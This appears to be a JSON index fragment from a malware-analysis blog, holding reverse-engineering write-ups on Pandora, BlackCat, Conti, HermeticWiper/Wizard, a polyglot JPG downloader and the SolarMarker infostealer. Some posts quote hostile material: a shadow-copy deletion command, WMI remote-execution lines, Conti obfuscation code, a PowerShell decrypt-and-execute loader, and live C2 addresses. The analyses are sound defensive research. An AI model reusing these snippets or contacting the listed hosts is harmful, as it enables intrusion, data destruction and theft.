18446744072135251631, &#39;cmovz&#39;, 140697838578772, &#39;rcx&#39;, 140697838578785, 140697838577648) (140697838578913, 140697838578939, 389785057, &#39;cmovz&#39;, 140697838578928, &#39;rcx&#39;, 140697838578941, 140697838577648) (140697838579331, 140697838579357, 18446744072886880558, &#39;cmovz&#39;, 140697838579346, &#39;rcx&#39;, 140697838579359, 140697838577648) (140697838579420, 140697838579446, 2056782390, &#39;cmovz&#39;, 140697838579435, &#39;rcx&#39;, 140697838579448, 140697838577648) (140697838579517, 140697838579542, 18446744072645564105, &#39;setz&#39;, 140697838579524, &#39;rcx&#39;, 140697838579544, 140697838577648) (140697838579720, 140697838579746, 1020697904, &#39;cmovz&#39;, 140697838579735, &#39;rcx&#39;, 140697838579748, 140697838577648) (140697838579794, 140697838579820, 18446744073387544561, &#39;cmovz&#39;, 140697838579809, &#39;rcx&#39;, 140697838579822, 140697838577648) . IDA Patch Basic Blocks . Copy the output table from our emulator and use it to patch out each bb with a conditional jmp and an unconditional jmp based on the emulation results. . import struct bb_jmp_table = [(140697838577608, 140697838577634, 2107475699, &#39;cmovz&#39;, 140697838577623, &#39;rcx&#39;, 140697838579921, 140697838577648), (140697838577648, 140697838577687, 280783992, &#39;cmovl&#39;, 140697838577658, &#39;rdx&#39;, 140697838577689, 140697838577840), (140697838577689, 140697838577710, 18446744072686906926, &#39;cmovl&#39;, 140697838577699, &#39;rdx&#39;, 140697838577712, 140697838578096), (140697838577712, 140697838577733, 18446744072142530087, &#39;cmovl&#39;, 140697838577722, &#39;rdx&#39;, 140697838577735, 140697838578329), (140697838577735, 140697838577761, 18446744072135251631, &#39;cmovl&#39;, 140697838577750, &#39;rdx&#39;, 140697838577763, 140697838578757), (140697838577763, 140697838577789, 18446744071775716404, &#39;cmovz&#39;, 140697838577778, &#39;rcx&#39;, 140697838577791, 140697838577648), (140697838577840, 140697838577861, 1814337361, &#39;cmovl&#39;, 140697838577850, &#39;rdx&#39;, 140697838577863, 140697838578224), (140697838577863, 140697838577889, 992709150, &#39;cmovl&#39;, 140697838577878, &#39;rdx&#39;, 140697838577891, 140697838578441), (140697838577891, 140697838577917, 389785057, &#39;cmovl&#39;, 140697838577906, &#39;rdx&#39;, 140697838577919, 140697838578913), (140697838577919, 140697838577944, 280783992, &#39;setz&#39;, 140697838577926, &#39;rcx&#39;, 140697838577946, 140697838577648), (140697838578096, 140697838578122, 18446744072975528772, &#39;cmovl&#39;, 140697838578111, &#39;rdx&#39;, 140697838578124, 140697838578531), (140697838578124, 140697838578150, 18446744072886880558, &#39;cmovl&#39;, 140697838578139, &#39;rdx&#39;, 140697838578152, 140697838579331), (140697838578152, 140697838578178, 18446744072686906926, &#39;cmovz&#39;, 140697838578167, &#39;rcx&#39;, 140697838578180, 140697838577648), (140697838578224, 140697838578250, 2104599011, &#39;cmovl&#39;, 140697838578239, &#39;rdx&#39;, 140697838578252, 140697838578619), (140697838578252, 140697838578278, 2056782390, &#39;cmovl&#39;, 140697838578267, &#39;rdx&#39;, 140697838578280, 140697838579420), (140697838578280, 140697838578306, 1814337361, &#39;cmovz&#39;, 140697838578295, &#39;rcx&#39;, 140697838578308, 140697838577648), (140697838578329, 140697838578355, 18446744072645564105, &#39;cmovl&#39;, 140697838578344, &#39;rdx&#39;, 140697838578357, 140697838579517), (140697838578357, 140697838578383, 18446744072142530087, &#39;cmovz&#39;, 140697838578372, &#39;rcx&#39;, 140697838578385, 140697838577648), (140697838578441, 140697838578462, 1020697904, &#39;setl&#39;, 140697838578448, &#39;rdx&#39;, 140697838578464, 140697838579720), (140697838578464, 140697838578489, 992709150, &#39;setnz&#39;, 140697838578471, &#39;rcx&#39;, 140697838577648, 140697838578491), (140697838578531, 140697838578557, 18446744073387544561, &#39;cmovl&#39;, 140697838578546, &#39;rdx&#39;, 140697838578559, 140697838579794), (140697838578559, 140697838578585, 18446744072975528772, &#39;cmovz&#39;, 140697838578574, &#39;rcx&#39;, 140697838578587, 140697838577648), (140697838578619, 140697838578645, 2107475699, &#39;cmovl&#39;, 140697838578634, &#39;rdx&#39;, 140697838578647, 140697838577608), (140697838578647, 140697838578673, 2104599011, &#39;cmovz&#39;, 140697838578662, &#39;rcx&#39;, 140697838578675, 140697838577648), (140697838578757, 140697838578783, 18446744072135251631, &#39;cmovz&#39;, 140697838578772, &#39;rcx&#39;, 140697838578785, 140697838577648), (140697838578913, 140697838578939, 389785057, &#39;cmovz&#39;, 140697838578928, &#39;rcx&#39;, 140697838578941, 140697838577648), (140697838579331, 140697838579357, 18446744072886880558, &#39;cmovz&#39;, 140697838579346, &#39;rcx&#39;, 140697838579359, 140697838577648), (140697838579420, 140697838579446, 2056782390, &#39;cmovz&#39;, 140697838579435, &#39;rcx&#39;, 140697838579448, 140697838577648), (140697838579517, 140697838579542, 18446744072645564105, &#39;setz&#39;, 140697838579524, &#39;rcx&#39;, 140697838579544, 140697838577648), (140697838579720, 140697838579746, 1020697904, &#39;cmovz&#39;, 140697838579735, &#39;rcx&#39;, 140697838579748, 140697838577648), (140697838579794, 140697838579820, 18446744073387544561, &#39;cmovz&#39;, 140697838579809, &#39;rcx&#39;, 140697838579822, 140697838577648)] for bb in bb_jmp_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] jmp_addr_satisfied = bb[6] jmp_addr_unsatisfied = bb[7] patch_jmp_cond_start = jmp_condition_address jmp_rel_statisfied = jmp_addr_satisfied - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = jmp_addr_unsatisfied - (patch_jmp_start + 5) if jmp_condition == &#39;cmovl&#39; or jmp_condition == &#39;setl&#39;: # jl patch_jmp_condition = b&#39; x0f x8c&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) elif jmp_condition == &#39;cmovz&#39; or jmp_condition == &#39;setz&#39;: # jz patch_jmp_condition = b&#39; x0f x84&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) elif jmp_condition == &#39;setnz&#39;: # jnz patch_jmp_condition = b&#39; x0f x85&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel_statisfied) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) # calculat nops for end of patch total_bytes = bb_end - jmp_condition_address + 2 nop_count = total_bytes - 11 # 11 bytes for the patch + nops to fill space patch_bytes = patch_jmp_condition + patch_jmp + b&#39; x90&#39;* nop_count # patch the bytes patch_ptr = jmp_condition_address for c in patch_bytes: patch_byte(patch_ptr, c) patch_ptr += 1 .",
            "url": "https://research.openanalysis.net/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/pandora_ransomware.html",
            "relUrl": "/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/pandora_ransomware.html",
            "date": " ‚Ä¢ Mar 19, 2022"
        }
        
    
  
    
        ,"post58": {
            "title": "BlackCat Ransomware",
            "content": "BlackCat/ALPHV crew made some adjustments to their ransomware. Previous methods for extracting the config aren‚Äôt working anymore. Introducing BlackCat/ALPHV 2.0??SHA1: 8c70191b12f14eed594388c8fbe05efe6ebaa564Cc @vxunderground @f0wlsec https://t.co/0Mz0cRMnTi . &mdash; pancak3 (@pancak3lullz) March 16, 2022 . Overview . Sample 6dd995d896a9a593b2c48d09da60bd83866d8577273f36d38788d83ad8173e68 . References . Sample is on MalwareBazaar | Old config extracto from f0wl on blackCatConf | Paloalto Threat Assessment: BlackCat Ransomware | Talos From BlackMatter to BlackCat: Analyzing two attacks from one affiliate | . Rust Reverse Engineering . BlackCat is written in Rust and is very time consuming to reverse engineer. To speed up the process we used a combination of debugging and some python scripts courtesy of @fwosar. . The Config . There is a new BlackCat ransomware sample out and it the config is now protected using a command line supplied ACCCESS_TOKEN. The token is used to generate an AES key which is then used to decrypt the encrypted config. . Notes . Ransomware options . USAGE: [OPTIONS] [SUBCOMMAND] OPTIONS: --access-token &lt;ACCESS_TOKEN&gt; Access Token --bypass &lt;BYPASS&gt;... --child Run as child process --drag-and-drop Invoked with drag and drop --drop-drag-and-drop-target Drop drag and drop target batch file --extra-verbose Log more to console -h, --help Print help information --log-file &lt;LOG_FILE&gt; Enable logging to specified file --no-net Do not discover network shares on Windows --no-prop Do not self propagate(worm) on Windows --no-prop-servers &lt;NO_PROP_SERVERS&gt;... Do not propagate to defined servers --no-vm-kill Do not stop VMs on ESXi --no-vm-kill-names &lt;NO_VM_KILL_NAMES&gt;... Do not stop defined VMs on ESXi --no-vm-snapshot-kill Do not wipe VMs snapshots on ESXi --no-wall Do not update desktop wallpaper on Windows -p, --paths &lt;PATHS&gt;... Only process files inside defined paths --propagated Run as propagated process --ui Show user interface -v, --verbose Log to console . Set desktop ransom note All Usersdeploy_note_and_image_for_all_users= . Mutex Local RustBacktraceMutex . Batch file name drag-and-drop-target.bat . Batch file contents (encrypted) . @ECHO OFF SETLOCAL SET allargs=%* &quot;${EXECUTABLE}&quot; --access-token ${ACCESS_TOKEN} --drag-and-drop -p %allargs% . Propogation . The ransomware contains an embedded encrypted copy of psExec. This is likely used as part of their propagation (worm). The ransomware can be executed via the drag-and-drop-target.bat batch files. These are a useful artifact to recover during IR as they will contain the ACCESS_TOKEN which can be used to decrypt the config. . Entropy Fider . To help identify high entropy sections of the binary (encrypted data) we used this nice script from @fwosar . def report_entropies(file_path): import rolling from pathlib import Path data = Path(file_path).read_bytes() entropies = rolling.Entropy(data, 512) high_entropy_start = None for i, entropy in enumerate(entropies): if entropy &gt; 7 and not high_entropy_start: high_entropy_start = i + 512 if entropy &lt; 7 and high_entropy_start: print(f&quot;Found high entropy section starting at {hex(high_entropy_start)} up to {hex(i + 512)}. Totalling {(i + 512) - high_entropy_start} bytes.&quot;) high_entropy_start = None if high_entropy_start: print(f&quot;Found high entropy section starting at {hex(high_entropy_start)} up to {hex(len(data))}. Totalling {len(data) - high_entropy_start} bytes.&quot;) .",
            "url": "https://research.openanalysis.net/blackcat/ransomware/malware/python/dumpulator/emulation/2022/03/16/blackcat_ransomware.html",
            "relUrl": "/blackcat/ransomware/malware/python/dumpulator/emulation/2022/03/16/blackcat_ransomware.html",
            "date": " ‚Ä¢ Mar 16, 2022"
        }
        
    
  
    
        ,"post59": {
            "title": "Hermetic Wizard Malware",
            "content": "Overview . In addition to the Hermetic Wiper malware there were at least three other components used to deploy the wiper bundled into a single binary and referred to as HermeticWizard. . HermeticWizard is started using the command line regsvr32.exe /s /i &lt;path&gt;. . Samples . HermeticWizard: a259e9b0acf375a8bef8dbc27a8a1996ee02a56889cba07ef58c49185ab033ec MalwareBazaar Sample . In the resources of HermeticWizard are two spreader components, a WMI spreader, and an SMB spreader. . WMI Spreader (exec_x32.dll) . Samples: 2d29f9ca1d9089ba0399661bb34ba2fd8aba117f04678cd71856d5894aa7150b . SMB Spreader (romance.dll) . Sample: 5a300f72e221a228e3a36a043bef878b570529a7abc15559513ea07ae280bb48 . WMI Spreader Analysis . The WMI spreader is a stand-alone untility that is used to copy files to remote shares and execute them. The spreader is excuted via HermeticWizard using the following example command line. . rundll32 &lt;spreader path&gt; #1 -s &lt;path to HermeticWizard&gt; ‚Äì i &lt;target IP&gt; . The spreader accepts the following command line arguments:-i,-h,-s,-a,-c . s path to the file to copy | i remote host IP | h optional remote share path (*not confirmed) | a optional brute force share password (*not confirmed) | c optional brute force share domain username password list (*not confirmed) | . Network Service Account . The spreader checks to see if it has local admin priviledges. If it has local admin it attempts to impersonate the Network Service service account. . Stack Overflow reference . NetworkService account . Limited service account that is meant to run standard privileged services. This account is &gt; far more limited than Local System (or even Administrator) but still has the right to access the network as the machine (see caveat above). . NT AUTHORITY NetworkService | the account has no password (any password information you provide is ignored) | HKCU represents the NetworkService user account | has minimal privileges on the local computer | presents the computer&#39;s credentials to remote servers | SID:S-1-5-20&gt; - has its own profile under the HKEY_USERS registry key (HKEY_USERSS-1-5-20) | If trying to schedule a task using it, enter NETWORK SERVICE into the Select User or Group &gt; dialog | . Share file copy . The spreader attempts to authenticate to the ADMIN&#36; remote share. If a password list is supplied on the command line the share authentication is brute forced. Once authenticated the files are copied to the share. . WMI COM Interface . For programatic access to WMI the wiper uses COM. . CLSID_WbemLocator {4590f811-1d3a-11d0-891f-00aa004b2e24} . IID_IWbemLocator {dc12a687-737f-11cf-884d-00aa004b2e24} . Big thanks to Mike Bailey for his COM Presentation. He also has a nice (free) video on Pluralsight. IDA has the vtable for IWbemLocator as a struct so we can just directly apply it. . Creating Processes Remotely using WMI . MSDN Reference . Similar example code from GitHub . Connection to remote host via WMI using &lt;target_ip&gt; root cimv2 . impersonate another user in CoCreateInstanceEx using COAUTHIDENTITY with COAUTHIDENTITY . Use WMI to access remote hosts . Method Win32_Process Create CommandLine | Command executed via WMI: | . C: Windows system32 cmd.exe /c start C: Windows system32 regsvr32.exe /s /i C: Windows %s.dll . This is used to launch the HermeticWizard binary that has been copied to the remote host. .",
            "url": "https://research.openanalysis.net/hermetic/hermetic%20wizard/spreader/malware/apt/2022/03/10/hermetic_wizard.html",
            "relUrl": "/hermetic/hermetic%20wizard/spreader/malware/apt/2022/03/10/hermetic_wizard.html",
            "date": " ‚Ä¢ Mar 10, 2022"
        }
        
    
  
    
        ,"post60": {
            "title": "Conti Ransomware V2 Source Code Leak",
            "content": "Overview . Some backstory here, a twitter account @contileaks began posting leaked chat logs and source code from the Conti ransomware group. Initially they posted a password protected archive of the Conti v2 source code. Later posted an archive of the source code with the locker cpp files removed and no password. This was apparently an attempt to prevent others from compiling the source code and using it. The release of the second archive allowed a cryptographic attack on the password protected archive and the release of the full source code. . Builder . The ransomware project comes with a builder that can be used to customize the compiled ransowmare binary (and decryptor). It basically runs a string replace on the binary to insert custom data like the RSA key and the decryption note. Some examples of the replaced strings are below. . __publickey__ __privatekey__ __DECRYPT_NOTE__ . Obfuscation . They are using a macro based on ADVObfuscator to obfuscate strings inline in the code. . #define OBFW(str)((const wchar_t*)MetaBuffer&lt;std::get&lt;MetaRandom2&lt;__COUNTER__, 30&gt;::value&gt;(PrimeNumbers), MetaRandom2&lt;__COUNTER__, 126&gt;::value, std::make_index_sequence&lt;sizeof(str)&gt;&gt;((const unsigned char*)str).decrypt()) . API Hashing . Hashing: MurmurHash2A contant=0x5bd1e995 . They pre-calculate the API hashes and define each API wrapper in api.cpp then call the API definitions in the code. This doesn&#39;t seem like the most efficient way to do API hashing. . Example. . inline DWORD WINAPI pGetProcessId( HANDLE Process ) { DWORD(WINAPI * pFunction)(HANDLE); pFunction = (DWORD(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x31d910df, 9);//GetProcAddress(hKernel32, OBFA(&quot;GetProcessId&quot;)); return pFunction(Process); } . Command Args . LPWSTR HostsPath = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-h&quot;)); LPWSTR PathList = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-p&quot;)); LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-m&quot;)); LPWSTR LogsEnabled = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-log&quot;)); . Encryption . Encryption Modes (File To Encrypt) . enum EncryptModes { ALL_ENCRYPT = 10, LOCAL_ENCRYPT = 11, NETWORK_ENCRYPT = 12, BACKUPS_ENCRYPT = 13 }; . Encrypt Modes (File Encryption) . Three modes of encryption based on file type and size. . enum ENCRYPT_MODES { FULL_ENCRYPT = 0x24, PARTLY_ENCRYPT = 0x25, HEADER_ENCRYPT = 0x26 }; . DB files get full encrypt | VM files get partial encrypt | Under 1M is full encrypt | Between 1M - 5M gets header encrypt | Over 5M is partial encrypt | . Partial Encrypt Mode . The partial encrypt mode can encrypt a file by percent, either 20% or 50%. This translates into a &quot;step&quot; size of data blocks that are encrypted in the file. . Delete Shadow Copies . Gain access to WMI via COM. . // Step 1: -- // Initialize COM. // Step 2: -- // Set general COM security levels -- // Step 3: // Obtain the initial locator to WMI - // Step 4: -- // Connect to WMI through the IWbemLocator::ConnectServer method // Connect to the root cimv2 namespace with // the current user and obtain pointer pSvc // to make IWbemServices calls. // Step 5: -- // Set security levels on the proxy - // Step 6: -- // Use the IWbemServices pointer to make requests of WMI - // For example, get the name of the operating system // Step 7: - // Get the data from the query in step 6 - // Get the value of the Name property // Cleanup // ======== . Copy-paste from MSDN WMI . Then use WMI to delete shadows . &quot;cmd.exe /c C: Windows System32 wbem WMIC.exe shadowcopy where &quot;ID=&#39;%s&#39; &quot; delete . KIll File Owner To Free File For Encryption . They use the RestartManager to enumerate processes with a handle to the file they are trying to encrypt. Then they can kill the process. . Crypto . Using the Windows crypto APIs to generate a chacha key CryptGenRandom then they use statically linked chcha algorithm to encrypt files then RSA encrypt the generated key. . The chacha library is a copy-paste from this chacha-merged.c . Also ref wiki article on chacha. . /* chacha-merged.c version 20080118 D. J. Bernstein Public domain. */ . Encrypted File Structure . The file is encrypted based on the encryption mode. The RSA encrypted chacha key is then appended to the encrypted file. Then a buffer containing the encryption mode constant and the data percent value is written to the file. This forms a footer that can be used by the decryptor to decrypt the file. . - encrypted data - RSA encrypted chacha key - byte encryption mode - byte percent value . File Share Scanning . Scan local subnets for hosts, then scan hosts for shares. . Directory Blacklist . OBFW(L&quot;tmp&quot;), OBFW(L&quot;winnt&quot;), OBFW(L&quot;temp&quot;), OBFW(L&quot;thumb&quot;), OBFW(L&quot;$Recycle.Bin&quot;), OBFW(L&quot;$RECYCLE.BIN&quot;), OBFW(L&quot;System Volume Information&quot;), OBFW(L&quot;Boot&quot;), OBFW(L&quot;Windows&quot;), OBFW(L&quot;Trend Micro&quot;) . File Extension Blacklist . OBFW(L&quot;.exe&quot;), OBFW(L&quot;.dll&quot;), OBFW(L&quot;.lnk&quot;), OBFW(L&quot;.sys&quot;), OBFW(L&quot;.msi&quot;), OBFW(L&quot;R3ADM3.txt&quot;), OBFW(L&quot;CONTI_LOG.txt&quot;) . Readme File . The file name is hardcoded in the binary R3ADM3.txt. . Log File . Logging is an option specified as a command parameter. The log file path is hard coded as C: CONTI_LOG.txt. .",
            "url": "https://research.openanalysis.net/conti/ransomware/malware/source/2022/03/03/conti_ransomware_source.html",
            "relUrl": "/conti/ransomware/malware/source/2022/03/03/conti_ransomware_source.html",
            "date": " ‚Ä¢ Mar 3, 2022"
        }
        
    
  
    
        ,"post61": {
            "title": "Hermetic Wiper Malware",
            "content": "Overview . Sample: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 . Sample 2: 0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da . References . Sample on Malshare | J. A. Guerrero-Saade Twitter Thread | ESET Twitter Thread | CrowdStrike Blog | SentinalOne Blog | . Backstory . Wiper binary is signed using a code signing certificate issued to Wiper binary is signed using a code signing certificate issued to Hermetica Digital Ltd | Wiper abuses legitimate drivers from the EaseUS Partition Master | Modifying CrashControl regkey, CrashDumpEnabled key to 0 | Enumerating PhysicalDrives up to 100 - can you even have 100 drives?? | . Abused Legit Drivers . The following legit drivers are stored in the resources section of the PE. They are compressed. . RCDATA_DRV_X64 (mscompress) e5f3ef69a534260e899a36cec459440dc572388defd8f1d98760d31c700f42d5 | RCDATA_DRV_X86 (mscompress) b01e0c6ac0b8bcde145ab7b68cf246deea9402fa7ea3aede7105f7051fe240c1 | RCDATA_DRV_XP_X64 (mscompress) b6f2e008967c5527337448d768f2332d14b92de22a1279fd4d91000bb3d4a0fd | RCDATA_DRV_XP_X86 (mscompress) fd7eacc2f87aceac865b0aa97a50503d44b799f27737e009f91f3c281233c17d | . Reversing Notes . Arg1 is a sleep before reboot (in minutes) Arg2 is sleep before ??? (minutes minus the arg1 sleep) . Grants itself SeBackupPrivilege, and SeShutdownPrivilege. Note, SeBackupPrivilege allows file content retrieval, even if the security descriptor on the file might not grant such access. . If the host is Windows Vista and above they use one set of drivers (64/32bit). For XP they use a different set of drivers (32/64bit). . Dissable crashdump using reg key SYSTEM CurrentControlSet Control CrashControl CrashDumpEnabled . Possible driver communication via named pipe . EPMNTDRV 0 . Write the driver from resource to ?? c: Windows system32 Drivers as an mscompress file. Then copy and decompress it to another file with the same name and a .sys file extension. Then grant SeLoadDriverPrivilege priviledges to self and load driver. . for i in range(0,41,4): print(f&quot;DWORD d{i};&quot;) . DWORD d0; DWORD d4; DWORD d8; DWORD d12; DWORD d16; DWORD d20; DWORD d24; DWORD d28; DWORD d32; DWORD d36; DWORD d40; .",
            "url": "https://research.openanalysis.net/hermetic/hermetic%20wiper/wiper/malware/apt/2022/02/27/hermetic_wiper.html",
            "relUrl": "/hermetic/hermetic%20wiper/wiper/malware/apt/2022/02/27/hermetic_wiper.html",
            "date": " ‚Ä¢ Feb 27, 2022"
        }
        
    
  
    
        ,"post62": {
            "title": "Reversing Unknown Polyglot JPG Downloader",
            "content": "Overview . The sample originated as a message through wechat. The mawlare is currently unknown. Submissions to VirusTotal indicate that the original file name was Áî≥ÂçöÂÖ¨Âè∏ÊúçÂä°Âô®ÈááË¥≠Ë°®.exe which roughly translates to Shenbo company server purchase form.exe . Sample: 104bd2d33c119d007df2adbc571a3e8cfac722cf1f0b6156ba211f413905e9f4 . When executed the sample downloads a polyglot jpg as a second stage from http://43.129.168.248/xlb.jpg . Second Stage: xlb.jpg - 32fb33a87f5123e919eb416b2c95a98b2f4b367812a51758bb1daeaf114b6b50 . Related samples on VirusTotal that download the same second stage. . Â§©ÂçöÁã¨Á´ãÁ´ô.bat translating to Tianbo Independent Station | ÊúçÂä°Âô®È¢Ñ‰ªòË°®1docx.bat translating to Server Prepaid Form | . References: . Malshare Sample - Stage 1 | Malshare Sample - Stage 2 (jpg) | Malshare Sample - Stage 3 (not confirmed!) | . Stage 1 . Download http://43.129.168.248/xlb.jpg -&gt; C: ProgramData xlb.jpg . Decrypt jpg starting at offset 83877 using -6 ^ 0x78 for range 7176 then directly execute! . import sys import os JPG_FILEPATH = r&#39;/tmp/work/xlb.jpg&#39; OUT_SHELLCODE_FILEPATH = r&#39;/tmp/work/shellcode.bin&#39; jpg_data = open(JPG_FILEPATH, &#39;rb&#39;).read() jpg_offset = 83877 out = [] for i in range(0,7176): out.append(((jpg_data[jpg_offset+i] - 6) &amp; 0xff) ^ 0x78) open(OUT_SHELLCODE_FILEPATH, &#39;wb&#39;).write(bytes(out)) . 7176 . Stage 2 . Check mutex ozhpanvityfxknsr to ensure we are only running once. . Check for a list of process names. . proc_names = [&#39;rr&#39;,&#39;471&#39;,&#39;tphpv&#39;,&#39;rjejbo&#39;,&#39;ufmfhsbn&#39;,&#39;hpphmf&#39;,&#39;xfdibu&#39;,&#39;gmzwqo&#39;,&#39;fu/fyf&#39;,&#39;xqt&#39;,&#39;ntfehf&#39;,&#39;fydfm&#39;,&#39;xpse&#39;,&#39;qpjou&#39;,&#39;usbz&#39;,&#39;gjsfgpy&#39;,&#39;thuppm&#39;,&#39;dmpve&#39;,&#39;opufqbe&#39;,&#39;dbmd&#39;,&#39;{ivepohgbohzv&#39;,&#39;mjof&#39;,&#39;rvjdlr&#39;] . for n in proc_names: out = &#39;&#39; for i in n: out += chr((ord(i) -1)&amp;0xff) print(out) . C2 Comms . The malware connect to the C2 via a TCP socket using a hardcoded IP and port 43.129.168.248:16166 . The malware sendd the C2 the it&#39;s current module name and waits to receive data. . The c2 return data is composed of a structure including a flag, length, xor key, data. . // DWORD flag // DWORD length // BYTE xor_key[32] // Data ... . The C2 data contains a stage3 PE file that is reflectivly loaded into memory by the malware and executed via the export PluginMe . Stage 3 . Stage3 was not directly recovered from the download chain but was recovered as an artifact from the infected host. An assumption was made that this was stage3 based on the unique export PluginMe. . Sample: 7d47e5871efc4c079531513f29926d394922d7954701f34dc6244ea311d20969 . Reversing Tips . The binary is witten in C++ with STL using MSVC 6.0 (very old). The STL types cause all kinds of pain but we can using Lumina and FLIRT to identify most of the functions. Rolf has a nice IDA script that will add some STL structs to IDA for us. . One STL type the pops up is the List. To use the script to add this struct simply run it in IDA then use MakeListTypes(DWORD) in the Python CLI to define the structs. . We also had trouble with the string object. This was resolved on stream. . General . Mutex name: db38wzikd . Store data in registry under key HKEY_CURRENT_USER Software 2345.com Mini . logname | . The logname is composed of the hostname username and timestamp likes so hostname-username-timestamp . &quot;%d%02d%02d%02d%02d%02d&quot;, SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond . group | host | install | . C2 Comms . C2 host: tesla.tomcat.buzz port 16333 -&gt; used to resolve to 43.129.168.248 (same as stage 1,2 C2) . The sample connects to the C2 and immediatly expects to recieve commands, no data is sent initially. . The C2 recv data is encrypted with ^ 0x33 - 103 . C2 command xlbfdc might cause the RAT to upload its accumulated data. .",
            "url": "https://research.openanalysis.net/polyglot/downloader/malware/ghost%20rat/gh0st/2022/02/20/polyglot_dropper_ghost.html",
            "relUrl": "/polyglot/downloader/malware/ghost%20rat/gh0st/2022/02/20/polyglot_dropper_ghost.html",
            "date": " ‚Ä¢ Feb 20, 2022"
        }
        
    
  
    
        ,"post63": {
            "title": "Jupyter Infostealer",
            "content": "Overview . Packed sample: ee904ce81c66b774897f93b0301e297a9137295516d57ba1c4e078a383cbce39 . The sample is too big for Malshare raw but we zipped it and uploaded it, the password is infected Malshare Zip Sample. . This is also known by some other names: Jupyter, Polazert, solarmarker, YellowCockatoo . References: . Morphisec Blog: Jupyter Infostealer | CrowdStrike: Blocking SolarMarker Backdoor | Talos: Solarmarker | . Unpacking Inno - Stage 1 . Tools . Inno Extractor (950208c1b7d4d901ca7b942f98214098dc91480cc70af1af12b2291544eb761f) | Inno Setup Decompiler (Pascal Decompiler) (602e0a4e1efaff739ee308da7fd4c4b5ca3aa6d0640f47ef74b0d445f968301b) | DirWatch (031e8f61f1501a76015d3add269663172abc648973032dcff4e758effa66b235) | . Behaviour . Inno installer drops and executes a benign file to attempt to look legitimate Docx2Rtf.exe (caf8e546f8c6ce56009d28b96c4c8229561d10a6dd89d12be30fa9021b1ce2f4) | The Inno compile Pascal script is used for the malicious install | The script drop two .txt files in %TEMP% with random names | One file is executed 9 times with PowerShell and is used to decrypt and launch the second file, which is also PowerShell | . Manual Extraction . Use Inno Extractor to extract all files from the Inno installer | Use Inno Setup Decompiler to decompile the extracted CompiledCode.bin file | Use DirWatch to monitor %temp% directory with &quot;auto save&quot; option eabled | Grab the two .txt PowerShell files that were dropped in %temp% - These are Stage 2 | . The PowerShell code below is used to decrypt the 2nd .txt PowerShell file . ; $xk=&#39;&#39;szikwYdJyBvQLWRAeNXPGaxEObVolScHnrKtqhMpfDjTIUgFuCmZ&#39;&#39;; $xb=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($p)); remove-item $p; for($i=0;$i -lt $xb.count;){ for($j=0;$j -lt $xk.length;$j++){ $xb[$i]=$xb[$i] -bxor $xk[$j]; $i++; if($i -ge $xb.count){$j=$xk.length} } }; $xb=[System.Text.Encoding]::UTF8.GetString($xb); iex $xb; . Stage 2 - PowerShell Deobfuscation . The 2nd stage PowerShell file is Base64 encoded and encrypted with a hard-coded XOR key (found in the first PowerShell script). Once decrypted the script is used to decrypt and reflectivly load a .NET assembly into it&#39;s own proccess memory. . Manual Extraction . Instead of attempting to maually decode the PowerShell we can take advantage of the fact that it relfectivly loads a .NET assembly to simply dump the assembly out of the process. . Run the malware and watch the process tree with ProcessHacker | When the PowerShell process executes suspend it (there are 9, just grab the one that stays running) | Use ExtreamDumper to dump the .NET assembly out of the PowerShell process | . Stage 3 - .NET Assembly . Config . ver = &quot;DR/1.1&quot;; xorkey = &quot;FVdXLbjs0Rwxsz9CrFh0pSot6Gijigf8t56R&quot;; addr = &quot;http://91.241.19.21&quot; . Hardware ID . The hardware ID is stored in %userprofile% AppData Roaming solarmarker.dat and is just a random string. . C2 Traffic . C2 traffic is encrypted using the xorkey from the hard coded config, then base64 encoded. . Command: ping . { &quot;action&quot;:&quot;ping&quot;, &quot;hwid&quot;:hwid, &quot;pc_name&quot;:M.GetComputerName(), &quot;os_name&quot;:M.GetWinVersion(), &quot;arch&quot;:M.Is64x()?&quot;x64&quot;:&quot;x86&quot;, &quot;rights&quot;:M.IsAdmin()?&quot;Admin&quot;:&quot;User&quot;, &quot;version&quot;:ldrConfig.ver, &quot;workgroup&quot;:M.GetWorkGroup()|M.WMI(&quot;win32_computersystem&quot;,&quot;domain&quot;), &quot;dns&quot;:(M.WMI(&quot;win32_computersystem&quot;,&quot;partofdomain&quot;).ToLower()==&quot;false&quot;)?&quot;0&quot;:&quot;1&quot;, &quot;protocol_version&quot;:1 } . The C2 can a command via the status var in the response json. The status can be either exe, ps1, or command. . Status: EXE and PS1 . The C2 can send down a stage4 payload that is either a PS1 or an EXE. For PS1 they create a file in %TEMP% and execute it with PowerShell just like the Stage 1 loader. If it&#39;s an EXE they drop it in the %TEMP% and execute it directly. . Status: Command . The C2 can send a PowerShell command that is directly executed. .",
            "url": "https://research.openanalysis.net/jupyter/malware/solarmarker/config/dot%20net/2022/01/30/jupyter_stealer.html",
            "relUrl": "/jupyter/malware/solarmarker/config/dot%20net/2022/01/30/jupyter_stealer.html",
            "date": " ‚Ä¢ Jan 30, 2022"
        }
        
    
  
    
        ,"post64": {
            "title": "HackingTeam Soldier Implant",
